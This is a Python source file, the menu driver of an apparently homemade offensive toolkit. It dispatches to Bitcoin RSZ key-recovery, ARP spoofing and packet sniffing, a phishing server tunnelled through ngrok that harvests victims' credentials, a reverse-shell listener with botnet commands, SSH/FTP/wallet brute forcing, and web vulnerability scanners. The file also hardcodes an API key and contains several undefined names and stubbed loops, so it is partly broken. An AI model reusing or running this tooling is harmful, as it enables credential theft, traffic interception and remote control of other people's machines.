from typing import *
import os
def main():
    while True:
        try:
            os.system('clear')
        except:
            os.system('cls')
        banner = '''
                                     ____   ____ ____ _____ 
                                    / ___| / ___|  _ \_   _|
                                    \___ \| |   | |_) || |  
                                     ___) | |___|  __/ | |  
                                    |____/ \____|_|    |_|   '''
        print(banner)
        options = '''
         choice 

         1) bitcoin exploit
         2) cryptography
         3) MITM
         4) phishing
         5) port scanning
         6) Google Dorking
         7) payloads
         8) Raspberry pico-Rubber Ducky 
         9) brute force
         10) web scane
         11) vulnerability search

         '''
        print(options)
        choice = int(input("SCPT_choice: "))
        if choice == 1:

            if "nt" in os.name:
                os.system('cls')
            else:
                os.system('clear')
            from btc_exploit import rsz_exploit, raw_tx

            options_btc = ''' 
            1) get bitcoin raw transposition
            2) exploit bitcoin rsz 
            '''
            print(options_btc)
            choice_btc = int(input("SCPT_choice: "))
            if choice_btc == 1:
                # row
                # TxId = str(input("Enter the TxID : "))
                # TxId: str = "9ec4bc49e828d924af1d1029cacf709431abbde46d59554b62bc270e3b29c4b1"
                TxId: str = str(input("transposition id: "))
                RX = raw_tx.Get_RAW_TX()
                RX_Output: str = RX.raw_txt(TxId)
                print(RX_Output)
            elif choice_btc == 2:
                # btc Exploit
                # r: str = "d47ce4c025c35ec440bc81d99834a624875161a26bf56ef7fdc0f5d52f843ad1"
                # s1: str = "44e1ff2dfd8102cf7a47c21d5c9fd5701610d04953c6836596b4fe9dd2f53e3e"
                # z1: str = "c0e2d0a89a348de88fda08211c70d1d7e52ccef2eb9459911bf977d587784c6e"
                # s2: str = "9a5f1c75e461d7ceb1cf3cab9013eb2dc85b6d0da8c3c6e27e3a5a5b3faa5bab"
                # z2: str = "17b0f41c8c337ac1e18c98759e83a8cccbc368dd9d89e5f03cb633c265fd0ddc"
                # address: str = "1BFhrfTTZP3Nw4BNy4eX4KFLsn9ZeijcMm"
                r: str = str(input("R value: "))
                s1: str = str(input("S1 value: "))
                z1: str = str(input("Z1 value: "))
                s2: str = str(input("S1 value: "))
                z2: str = str(input("Z2 value: "))
                address: str = str(input("address: "))
                RSz = rsz_exploit.RSZ_EXploit()
                RSz_out: Set[str] = RSz.exploit(address, r, s1, s2, z1, z2)
                print(RSz_out)
            else:
                print("wrong choice ")
            back_minu = int(input("1) for back to main minu , 2) for exit"))
            if back_minu == 2:
                os._exit(os.EX_OK)
            else:
                pass
        elif choice == 2:
            if "nt" in os.name:
                os.system('cls')
            else:
                os.system('clear')
            from cryptography_me_she import aes, hashs, rsa, bases
            from hash_Name.hash_name import HASH_Name

            options_crypto = ''' 
                1) AES_MODE_CBC
                2) RSA
                3) Bases
                4) Hashs
                5) Hash Name Guesser 
                '''
            print(options_crypto)
            choice_crpto = int(input("SCPT_choice: "))
            if (choice_crpto == 1):
                # aes.cec
                ke1 = str(input("set key =16 bytes: "))
                if (len(ke1) == 16):
                    key = bytes(ke1, 'ascii')
                else:
                    print("key size most be 16 ")
                    os._exit(0)
                plantxt: str = str(input("masg: "))
                AES_ED = aes.AES_CG()
                a: List[bytes] = AES_ED.encrp(plantxt, key)
                key: bytes = a[0]
                ciph: bytes = a[1]
                print("encoded= ", str(ciph)[1:])
                print("key= ", str(key)[1:])
                #
                ciph = bytes(str(input("encod: ")), 'ascii')
                key = bytes(str(input("key: ")), 'ascii')
                try:
                    dec: str = AES_ED.decp(ciph, key)
                    print("decode= ", dec)
                except:
                    print("wrong key")
            elif (choice_crpto == 2):
                # rsa
                CP = "mash shiky"
                RS = rsa.RSA_CG()
                keys = RS.gneKeys()
                print(keys, '\n')
                enc = str(RS.encodme(CP, keys["pubkey"]))[1:]
                print("encode= ", enc)
                enc22 = '9gYn3G56fHxEu5fy+uI30bgNJL0VJkyYVPpRe7aLSya1SxT0gF9B0Q1gQ1qxpDbUdMNAfCS5yKrCBDsxjtSEvFCGXVrIkDqrgf0I4CVZhcszNiwqxHzggow9A4LppyNhVCTa9l+IgUoHPZFnc+qLp2uItpYBgWGrpECHlwAfvOZy5mnBkNQCMTkAjN8fGfsDGXHPCrd5AOneCn3AXdqPyLtRJK4mb0qN7NM0fFUEuE+3s6PriIT3OJViR/r/NnFqjtO8GO8oXB9E3fMc/dsFh2nivvGOqzu4C7VBUg6+s2gd0H8uciq6ASQUxIv4Pdi0PXvHbWPpipdB94AzoQT7xQ=='
                # dec=str(RS.decome(enc22))[1:]
                # keo=open("privkey.txt", 'r')
                # kiooo=""
                # for i in keo:
                #     kiooo += i
                #     # print(i)
                # print(kiooo)
                # dec = str(RS.decome(enc22, kiooo))[1:]
                dec = str(RS.decome(enc, keys["privKey"]))[1:]
                print("decode= ", dec)
            elif (choice_crpto == 3):
                # bases
                ED: str = str(input("Enter , en for encoding  or de  for decoding: "))
                Bt: str = str(input("Enter the base type: "))
                CP: str = str(input("Enter the masg or the hash: "))
                BS = bases.Bases()
                if (ED == "en"):
                    BOutput: str = BS.base_encde(Bt, CP)
                    print(BOutput)
                else:
                    BOutput = BS.base_dencde(Bt, CP)
                    print(BOutput)
            elif (choice_crpto == 4):
                # hash
                type_hash: str = str(input("hash_type: "))
                masg: str = str(input("enter masg: "))
                HA = hashs.Hashing()
                hash: str = HA.hashing(type_hash, masg)
                print(hash)
            elif (choice_crpto == 5):
                hash: str = str(input("hash: "))
                # hash="716f6e863f744b9ac22c97ec7b76ea5f5908bc5b2f67c61510bfc4751384ea7a"
                # hash="c6cbd89c926ab525c242e6621f2f5fa73aa4afe3d9e24aed727faaadd6af38b620bdb623dd2b4788b1c8086984af8706"
                print("hash: ", hash, "\nHash_len: ", len(hash))
                HN = HASH_Name()
                Houtput: str = HN.hahs_type(hash)
                print(Houtput)
            else:
                print("wrong choice ")
            back_minu = int(input("1) for back to main minu , 2) for exit"))
            if back_minu == 2:
                os._exit(os.EX_OK)
            else:
                pass
        elif (choice == 3):
            if "nt" in os.name:
                os.system('cls')
            else:
                os.system('clear')
            from mitm import arp_spoof, divice_scann, http_request3333

            options_MITM = ''' 
                    1) ARP Spoofing
                    2) Divices conncected to the netwrok
                    3) http sniffer 
                    '''
            print(options_MITM)
            choice_MITM = int(input("SCPT_choice: "))
            if (choice_MITM == 1):
                # arp_spoof
                target, host, verbose = args.target, args.host, args.show_running
                arping = arp_spoof.Arp_SpoofMITM()
                arping.is_ipforwd()
                try:
                    while True:
                        # telling the `target` that we are the `host`
                        arping.start_spoofing(target, host, verbose)
                        # telling the `host` that we are the `target`
                        arping.start_spoofing(host, target, verbose)
                        # sleep for one second
                        time.sleep(1)
                except KeyboardInterrupt:
                    print("[!] Detected CTRL+C ! restoring the network, please wait...")
                    arping.resete_target(target, host)
                    arping.resete_target(host, target)
            elif (choice_MITM == 2):
                # Divice_MAC_Find
                # IP Address for the destination
                target_ip = str(input("Enter the ip range: "))
                DMC = divice_scann.Divice_MAC_Find()
                clients = DMC.device_mac_finder(target_ip)
                # print clients
                print("Available devices in the network:")
                print("IP" + " " * 18 + "MAC" + " " * 18 + "NAME")
                for client in clients:
                    print("{:16}    {}    {}".format(client['ip'], client['mac'], getfqdn(client['ip'])))

            elif (choice_MITM == 3):
                iface = str(input("Enter the wlan name: "))
                # show_raw = args.show_raw
                http_sn = http_request3333.http_Sniff()
                http_sn.sniff_packets(http_sn.process_packet, iface)
            else:
                print("wrong choice ")
            back_minu = int(input("1) for back to main minu , 2) for exit"))
            if back_minu == 2:
                os._exit(os.EX_OK)
            else:
                pass
        elif (choice == 4):
            if "nt" in os.name:
                os.system('cls')
            else:
                os.system('clear')
            from Phishing import test_cli22
            import subprocess as sp
            from os import system
            import multiprocessing

            dirk: str = str(sp.getoutput('pwd'))
            if ("/Phishing" not in dirk):
                dirk += "/Phishing"
            try:
                PHish = test_cli22.Phishing_cli()
                PHish.check_need()
                PHish.mainMenu()
                # customOption = "1"
                # PHish.runPhishing('Facebook', customOption,PHish.dirk)

                system('clear')
                print('''\nChoose Wisely As Your Victim Will Redirect to This Link''')
                print(
                    '''\nDo not leave it blank. Unless Errors may occur''')
                print(
                    '''\nInsert a custom redirect url:''')
                custom = str(input('''\nREDIRECT HERE>>> '''))
                PHish.inputCustom(custom, dirk)
                port = 56
                PHish.runServer(port)
                url = PHish.runNgrok(port, dirk)
                print(url)
                multiprocessing.Process(target=PHish.runServer, args=(port,)).start()
                PHish.getCredentials()
            except KeyboardInterrupt:
                system('sudo pkill ngrok')
                exit()
            back_minu = int(input("1) for back to main minu , 2) for exit"))
            if back_minu == 2:
                os._exit(os.EX_OK)
            else:
                pass

        elif (choice == 5):
            if "nt" in os.name:
                os.system('cls')
            else:
                os.system('clear')
            from port_scanner import port_scan

            target: str = str(input('enter terget sprate terget by ,: '))
            option = int(input('chose 1:for all ports , 2:for sepsefck port: '))
            timeoutes_str = str(input('chose, press enter to use the deflate timeout or set the timeout:  '))
            if option == 2:
                port = str(input('enter the port sprate ports by , : '))
                if (',' in target):
                    sv: List[str] = target.split(',')
                    for i in sv:
                        print("target: " + str(i.strip(' ')))
                        PS = port_scan.PORT_SCAN(i.strip(' '))
                        if timeoutes_str == "":
                            if (',' in port):
                                PoS: List[str] = port.split(',')
                                for PK in PoS:
                                    Pi: int = int(PK.strip(' '))
                                    LPSOutput01: str = PS.scan_port(PS.target_p_ip, Pi)
                                    if LPSOutput01 == None:
                                        pass
                                    else:
                                        print(LPSOutput01)
                            else:
                                Pi: int = int(port.strip(' '))
                                LPSOutput01: str = PS.scan_port(PS.target_p_ip, Pi)
                                if LPSOutput01 == None:
                                    pass
                                else:
                                    print(LPSOutput01)


                        else:
                            if (',' in port):
                                PoS: List[str] = port.split(',')
                                for PK in PoS:
                                    Pi: int = int(pk.strip(' '))
                                    LPSOutput01 = PS.scan_port(PS.target_p_ip, Pi, float(timeoutes_str))
                                    if LPSOutput01 == None:
                                        pass
                                    else:
                                        print(LPSOutput01)
                            else:
                                Pi: int = int(port.strip(' '))
                                LPSOutput01 = PS.scan_port(PS.target_p_ip, Pi, float(timeoutes_str))
                                if LPSOutput01 == None:
                                    pass
                                else:
                                    print(LPSOutput01)

                else:
                    PS = port_scan.PORT_SCAN(target)
                    print("target: " + str(target))

                    if timeoutes_str == "":
                        if (',' in port):
                            PoS: List[str] = port.split(',')
                            for pk in PoS:
                                # print("here2")
                                Pi: int = int(pk.strip(' '))
                                PSOutput02: str = PS.scan_port(PS.target_p_ip, Pi)
                                if PSOutput02 == None:
                                    pass
                                else:
                                    print(PSOutput02)
                        else:
                            Pi: int = int(port.strip(' '))
                            PSOutput02: str = PS.scan_port(PS.target_p_ip, Pi)
                            if PSOutput02 == None:
                                pass
                            else:
                                print(PSOutput02)

                    else:
                        # print("here1")
                        if (',' in port):
                            # print("here")
                            PoS: List[str] = port.split(',')
                            for pk in PoS:
                                Pi: int = int(pk.strip(' '))
                                PSOutput02 = PS.scan_port(PS.target_p_ip, Pi, float(timeoutes_str))
                                if PSOutput02 == None:
                                    pass
                                else:
                                    print(PSOutput02)
                        else:
                            # print("here1")
                            Pi: int = int(port.strip(' '))
                            PSOutput02 = PS.scan_port(PS.target_p_ip, Pi, float(timeoutes_str))
                            if PSOutput02 == None:
                                pass
                            else:
                                print(PSOutput02)

            else:
                if (',' in target):
                    sv = target.split(',')
                    for i in sv:
                        print("target: " + str(i.strip(' ')))
                        PS = port_scan.PORT_SCAN(i.strip(' '))
                        if timeoutes_str == "":
                            LPSOutput01 = PS.Scan_All_Ports()
                            print(LPSOutput01)
                        else:
                            LPSOutput01 = PS.Scan_All_Ports(float(timeoutes_str))
                            print(LPSOutput01)
                else:
                    PS = port_scan.PORT_SCAN(target)
                    print("target: " + str(target))
                    if timeoutes_str == "":
                        PSOutput02 = PS.Scan_All_Ports()
                        print(PSOutput02)
                    else:
                        PSOutput02 = PS.Scan_All_Ports(float(timeoutes_str))
                        print(PSOutput02)
            back_minu = int(input("1) for back to main minu , 2) for exit"))
            if back_minu == 2:
                os._exit(os.EX_OK)
            else:
                pass
        elif (choice == 6):
            if "nt" in os.name:
                os.system('cls')
            else:
                os.system('clear')
            from google_dorking.google_dorl import GooGle_Dork

            search: str = str(input("search: "))
            dork: int = 2
            GD = GooGle_Dork()
            GD_Output: str = GD.dork(search, dork)
            print(GD_Output)
            back_minu = int(input("1) for back to main minu , 2) for exit"))
            if back_minu == 2:
                os._exit(os.EX_OK)
            else:
                pass
        elif (choice == 7):
            if "nt" in os.name:
                os.system('cls')
            else:
                os.system('clear')
            from payload import lick

            host = str(input("enter the ip: "))
            port = int(input("enter the port: "))
            rv = lick.revab(host, port)
            while True:
                choice = int(input("1) for list all connection, 2) for connect,3) for botnet,4)exit: "))
                if (choice == 1):
                    rv.getconnections()
                    rv.allin()
                elif (choice == 2):
                    try:
                        index = int(input("choise: ")) - 1
                        rv.accept_con2(index)
                    except:
                        pass
                elif (choice == 4):
                    sys.exit()
                elif (choice == 3):
                    # comand = ""
                    while True:
                        comand = str(input("bot_command: "))
                        if (comand == "exit"):
                            break
                        else:
                            rv.botnet_gui(comand)
                else:
                    print("wrong choice")
            back_minu = int(input("1) for back to main minu , 2) for exit"))
            if back_minu == 2:
                os._exit(os.EX_OK)
            else:
                pass
            pass
        elif (choice == 8):
            if "nt" in os.name:
                os.system('cls')
            else:
                os.system('clear')
            back_minu = int(input("1) for back to main minu , 2) for exit"))
            if back_minu == 2:
                os._exit(os.EX_OK)
            else:
                pass
            pass

        elif (choice == 9):
            if "nt" in os.name:
                os.system('cls')
            else:
                os.system('clear')
            from brute.protcal_brutfroce import ftp, ssh
            from brute.last_brutfroce import btc_1, etm_1
            from hash_bruutefrocer.hash_brute import Hash_Brut

            options_brute = ''' 
                1) ssh
                2) ftp
                3) web site
                4)hash brute force
                5)Cryptocurrency
                '''
            print(options_brute)
            choice_brute = int(input("SCPT_choice: "))
            if choice_brute == 1:
                # SSH
                host = str(input("target_ip_address: "))
                passlist = str(input("word_list: "))
                user = str(input("username: "))
                # dirk: str = str(sp.getoutput('pwd'))
                # dirk = dirk.replace('/brute/protcal_brutfroce', '/Reports/brute-for/')
                # read the file
                passlist = open(passlist).read().splitlines()
                # brute-force
                sshB = ssh.SSH_Brut()
                for password in passlist:
                    # if sshB.is_ssh_open(host, user, password):
                    # if combo is valid, save it to a file
                    break
            elif choice_brute == 2:
                # hostname or IP address of the FTP server
                host = str(input("target_ip_address: "))
                # username of the FTP server, root as default for linux
                user = str(input("username: "))
                # port of FTP, aka 21
                port = int(input("port: "))
                # read the wordlist of passwords
                passw = str(input("word_list: "))
                passwords = open(passw).read().split("\n")
                print("[+] Passwords to try:", len(passwords))
                ftp = ftp_brute(host, user, port)
                try:
                    for password in passwords:
                        ftb = ftp.connect_ftp(password)

                        if ftb != None:
                            print(f"{ftp.GREEN}[+] Found credentials: \n")
                            print(f"{ftb} {ftp.RESET}")
                            break
                except:
                    pass
            elif choice_brute == 3:
                pass
            elif choice_brute == 4:
                HBrut = Hash_Brut()
                hash: str = "f1e719e97deac6f4bf9f6ea82a7b0c66"
                types: str = "md5"
                HB_Output: str = HBrut.hashdecod(types, hash)
                print(HB_Output)
            elif choice_brute == 5:
                try:
                    os.system('clear')
                except:
                    os.system('cls')
                options_brute_crypto = ''' 
                            1) Bitcoin
                            2) Ethereum
                            '''
                print(options_brute_crypto)
                choice_brute_crypto = int(input("SCPT_choice: "))
                if (choice_brute_crypto == 1):
                    adp: str = str(input("Enter address: "))
                    BTC = btc_1.BTC_Brut()
                    B_Output: Set[str] = BTC.btc_wordlist_brut(adp)
                    print(B_Output)
                    # w = open('test.txt', 'w')
                    # w.write("")
                    # w.close()
                elif (choice_brute_crypto == 2):
                    add: str = str(input("Enter address: "))
                    EH = etm_1.ETM_Brut()
                    Eoutput: Set[str] = EH.eth_brut(add)
                    print(Eoutput)
                    # w = open('test_eth.txt', 'w')
                    # w.write("")
                    # w.close()
                else:
                    print("wrong choice ")
            else:
                print("wrong choice ")
            back_minu = int(input("1) for back to main minu , 2) for exit"))
            if back_minu == 2:
                os._exit(os.EX_OK)
            else:
                pass

        elif (choice == 10):
            if "nt" in os.name:
                os.system('cls')
            else:
                os.system('clear')
            from web_scanner import sql2, RCE, xss2, web_dir2, subdomain

            options_web = ''' 
                1) web dir
                2) sub dir
                3) xss
                4) sql inj
                5) RCE
                '''
            print(options_web)
            choice_web = int(input("SCPT_choice: "))
            if choice_web == 1:
                # web_dir

                # inputting the domain name
                # dom_name ="www.google.com"
                dom_name = "http://192.168.82.128"

                # openning the subdomain text file
                # dirs_larg
                with open('dirs_small.txt', 'r') as file:
                    # reading the file
                    name = file.read()

                    # using spilitlines() function storing the list
                    # of splitted strings
                    dirs = name.splitlines()

                # calling the function for scanning the subdomains
                # and getting the url
                web_dir2.dir_scanner(dom_name, dirs)

            elif choice_web == 2:
                # sub_dir

                # inputting the domain name
                dom_name = "google.com"

                # openning the subdomain text file
                import subprocess as sp

                dirk: str = str(sp.getoutput('pwd')) + "/web_scanner/subdomain.txt"

                with open(dirk, 'r') as file:
                    # reading the file
                    name = file.read()

                    # using spilitlines() function storing the list
                    # of splitted strings
                    sub_dom = name.splitlines()

                # calling the function for scanning the subdomains
                # and getting the url
                sopppp = subdomain.sub_domloooop()
                sopppp.domain_scanner(dom_name, sub_dom)
                # domain_scanner2(dom_name,sub_dom)
                # soo=sub_dom()
                # soo.domain_scanner(dom_name,sub_dom)
                # soo.domain_scanner(dom_name, sub_dom)

            elif choice_web == 3:
                # xss
                # url = "https://xss-game.appspot.com/level1/frame"
                # url = "http://testphp.vulnweb.com/artists.php?artist=4"
                url = "http://192.168.82.128/dvwa/vulnerabilities/xss_r/"
                # url = "http://192.168.1.100/dvwa/vulnerabilities/xss_s/"
                # url = "http://192.168.1.100/dvwa/vulnerabilities/xss_r"
                # url = "http://192.168.1.100/mutillidae/index.php?page=dns-lookup.php"
                XSS = xss2.xss_scan()
                print("is_vulnerable:", XSS.scan_xss(url))

            elif choice_web == 4:
                # sql
                # import sys
                # url = "http://testphp.vulnweb.com/artists.php?artist=1"
                # url ="http://testphp.vulnweb.com/artists.php?artist=1"
                url = "http://192.168.82.128/dvwa/vulnerabilities/sqli/?id=1"
                # url = "http://192.168.1.100/dvwa/vulnerabilities/sqli_blind/"
                # url = "https://www.youtube.com/watch?v=T1YtluXYwN8&list=RDMM&index=17&ab_channel=NiallStenson"
                SQL_INJ = sql2.sql_injScan()
                SQL_INJ.scan_sql_injection(url)

            elif choice_web == 5:
                # rce
                # import sys
                # url = "http://testphp.vulnweb.com/artists.php?artist=1"
                # url ="http://testphp.vulnweb.com/artists.php?artist=1"
                url = "http://192.168.82.128/dvwa/vulnerabilities/exec/"
                # url = "https://www.youtube.com/watch?v=T1YtluXYwN8&list=RDMM&index=17&ab_channel=NiallStenson"
                RCE = RCE.RCE_Scan()
                RCE.scan_RCE(url)
            else:
                print("wrong choice ")
            back_minu = int(input("1) for back to main minu , 2) for exit"))
            if back_minu == 2:
                os._exit(os.EX_OK)
            else:
                pass
        elif (choice == 11):
            if "nt" in os.name:
                os.system('cls')
            else:
                os.system('clear')
            from vunlseac import cve, vlunse, gtfobins

            options_vuln = ''' 
                1) vuldb
                2) cve
                3) gtfobin
                '''
            print(options_vuln)
            choice_vuln = int(input("SCPT_choice: "))
            if choice_vuln == 1:
                api_key: str = "66a0565094d918c985d5de682c87606b"
                service: str = "ssh 2"
                VS = vlunse.Vulnerability_Search()
                bug: List[str] = VS.vuln_search(service, api_key)
                print(bug)
            elif choice_vuln == 2:
                # search: str = "5.10.0 kali7"
                search: str = "vsFTPd 2.3.4"
                CV = cve.CVE_Search()
                d: Dict[str, str] = CV.cve_search(search.replace(' ', '+'))
                print(d)
            elif choice_vuln == 3:
                search: str = "nmap"
                # dork:int=3
                GD = gtfobins.GooGle_Dork()
                GD_Output: str = GD.dork(search)
                print(GD_Output)
            else:
                print("wrong choice ")
            back_minu = int(input("1) for back to main minu , 2) for exit"))
            if back_minu == 2:
                os._exit(os.EX_OK)
            else:
                pass

        else:
            print("wrong choice ")
if __name__=="__main__":
    main()